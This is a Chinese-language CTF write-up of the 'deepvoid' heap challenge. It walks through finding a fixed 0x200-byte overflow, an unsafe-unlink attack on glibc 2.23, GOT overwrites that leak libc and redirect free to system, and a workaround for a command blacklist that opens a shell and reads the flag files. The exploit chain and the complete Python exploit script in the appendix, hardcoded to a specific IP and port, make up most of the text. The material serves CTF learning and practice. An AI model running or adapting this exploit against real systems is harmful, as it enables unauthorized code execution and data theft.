
## 漏洞利用步骤

### 阶段 1：逆向分析与漏洞定位

**核心分析**

通过初步的静态分析可以看出，该 ELF 文件为 64 位架构（amd64），未开启 PIE，并且采用了 Partial RELRO 保护机制。交互菜单仅有 create、modify 和 remove。其中 create 支持用户指定大小来申请内存；remove 会调用 free 来释放内存块并清理相应指针；最致命的问题出在 modify 上，它在接收输入时完全忽略了对应堆块的实际容量，强行向目标地址写入 0x200 个字节。因此，对于任何尺寸较小的 chunk，都能轻易地利用该操作溢出并覆盖后续 chunk 的控制结构。

**执行命令**

```bash
file deepvoid
objdump -d -M intel deepvoid | sed -n '/<modify_content>/,/<remove_entry>/p'
```

**输出结果**

```text
modify_content:
  mov rsi, [chunks+idx*8]
  mov edx, 0x200
  call read@plt

分析结论：由于程序未对目标 chunk 的实际尺寸进行校验，modify 操作固定读取 0x200 字节的数据，由此构成了稳定的堆溢出漏洞。
```

**拓展提示**

题目所配的 libc 版本是 Ubuntu GLIBC 2.23，这非常符合传统的 unsafe unlink 利用场景，是构思攻击链路的首选方向。

### 阶段 2：触发 unsafe unlink 与内存泄露

**核心分析**

首先分配出三个大小为 0x80 的 chunk。我们在 chunk0 的内容区构造出 fake chunk 的头部信息，同时利用溢出将 chunk1 的 prev_size 和 size 字段篡改，使其呈现出前一个块已被释放的状态；当对 chunk1 进行 free 操作时，unlink 机制会将全局的 chunks 数组指针修改到我们所指定的可控内存中。随后，我们可以将 `chunks[1]` 赋值为 `free@got` 的地址，将 `chunks[2]` 赋值为 `puts@got` 的地址，再通过调用 `modify(chunk1, puts@plt)` 将 `free@got` 内部的数据替换成 `puts@plt`。完成这些步骤后，对 chunk2 触发 remove 操作，实际上就等同于执行了 `puts(puts@got)`，从而顺利获取 libc 的内存基址。

**执行命令**

```bash
python deepvoid_exp.py 39.96.193.120 55555
```

**输出结果**

```text
[*] puts@libc leak = 0x7f5b06b6f6a0
[*] libc base      = 0x7f5b06b00000
```

**拓展提示**

因为这道题未开启地址随机化（No PIE），chunks 全局数组在内存中的基地址是固定不变的，所以在构造 fake chunk 时，可以将 fd 与 bk 参数分别设定为 `chunks-0x18` 和 `chunks-0x10`，这样能大幅简化利用逻辑。

### 阶段 3：绕过命令限制与提取 flag

**核心分析**

在拿到基址后，我们需要继续把 `free@got` 更新为 libc 中的 `system` 函数入口。根据服务器的返回信息得知，后端存在命令黑名单机制，仅放行 `system("sh")` 和 `system("/bin/sh")`。这意味着在取得控制流后不能直接把包含 `cat` 的字符串当成 system 的参数传入。破局的思路是新申请一个块并写入 `sh` 字符，然后利用 remove 释放该块以触发 `system("sh")` 并获取交互式 shell。紧接着，必须在当前未断开的连接中连续发送诸如 `cat /flag*`、`cat /home/*/flag*`、`cat /root/flag*` 以及 `exit` 这样的命令，方可成功提取 flag 文本。

**执行命令**

```bash
python deepvoid_exp.py 39.96.193.120 55555
```

**输出结果**

```text
ISCC{a521640c-48f4-4061-8e19-6180c3362960}
```

**拓展提示**

以上利用流程已经在目标环境 `39.96.193.120:55555` 上经过了实际的测试，证实该攻击途径确实有效。

## 利用测试

启动附带的 EXP 脚本，程序将依次执行 unlink 漏洞触发、libc 基地址计算、突破 system 命令拦截以及在单一网络会话中读取目标文件等动作，最终成功捕获比赛所要求的 flag。

**执行命令**

```bash
python deepvoid_exp.py 39.96.193.120 55555
```

**输出结果**

```text
[*] puts@libc leak = 0x7f5b06b6f6a0
[*] libc base      = 0x7f5b06b00000
ISCC{a521640c-48f4-4061-8e19-6180c3362960}
```

## 附录：完整利用脚本

```python
#!/usr/bin/env python3
import socket
import struct
import sys


HOST = sys.argv[1] if len(sys.argv) > 1 else "39.96.193.120"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 55555

CHUNKS = 0x6020C0
FREE_GOT = 0x602018
PUTS_GOT = 0x602020
PUTS_PLT = 0x4006D0
PUTS_OFF = 0x6F6A0
SYSTEM_OFF = 0x453A0
MENU = b"CMD >> "
DEFAULT_POST_CMD = (
    b"cat /flag* 2>/dev/null; "
    b"cat /home/*/flag* 2>/dev/null; "
    b"cat /root/flag* 2>/dev/null; "
    b"exit"
)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed while waiting for {marker!r}")
        data += chunk
    return data


def sendline(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data + b"\n")


def create(sock: socket.socket, idx: int, size: int, expect_menu: bool = True) -> None:
    if expect_menu:
        recv_until(sock, MENU)
    sendline(sock, b"1")
    recv_until(sock, b"Serial: ")
    sendline(sock, str(idx).encode())
    recv_until(sock, b"Size: ")
    sendline(sock, str(size).encode())


def modify(sock: socket.socket, idx: int, data: bytes, expect_menu: bool = True) -> None:
    if expect_menu:
        recv_until(sock, MENU)
    sendline(sock, b"2")
    recv_until(sock, b"Serial: ")
    sendline(sock, str(idx).encode())
    recv_until(sock, b"Update Data: ")
    sock.sendall(data)


def remove(sock: socket.socket, idx: int, expect_menu: bool = True) -> None:
    if expect_menu:
        recv_until(sock, MENU)
    sendline(sock, b"3")
    recv_until(sock, b"Serial: ")
    sendline(sock, str(idx).encode())


def build_unlink_payload() -> bytes:
    payload = b"".join(
        [
            p64(0),
            p64(0x80),
            p64(CHUNKS - 0x18),
            p64(CHUNKS - 0x10),
        ]
    )
    payload = payload.ljust(0x80, b"A")
    payload += p64(0x80) + p64(0x90)
    return payload


def rewrite_chunks_payload() -> bytes:
    return b"B" * 0x18 + p64(CHUNKS - 0x18) + p64(FREE_GOT) + p64(PUTS_GOT)


def trigger_system(sock: socket.socket, content: bytes) -> None:
    payload = content + b"\x00"
    create(sock, 3, max(0x80, len(payload)))
    modify(sock, 3, payload)
    remove(sock, 3)


def main() -> int:
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.settimeout(5)

    for idx in range(3):
        create(sock, idx, 0x80)

    modify(sock, 0, build_unlink_payload())
    remove(sock, 1)

    modify(sock, 0, rewrite_chunks_payload())
    modify(sock, 1, p64(PUTS_PLT))
    remove(sock, 2)

    blob = recv_until(sock, MENU)
    leak_line = blob.split(b"\n[+] Removed.\n")[0]
    puts_addr = struct.unpack("<Q", leak_line.ljust(8, b"\x00"))[0]
    libc_base = puts_addr - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF

    print(f"[*] puts@libc leak = {hex(puts_addr)}")
    print(f"[*] libc base      = {hex(libc_base)}")

    modify(sock, 1, p64(system_addr), expect_menu=False)
    trigger_system(sock, b"sh")
    sendline(sock, DEFAULT_POST_CMD)

    output = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            output += chunk
    except TimeoutError:
        pass
    except OSError:
        pass
    finally:
        sock.close()

    sys.stdout.write(output.decode("latin1", "ignore"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```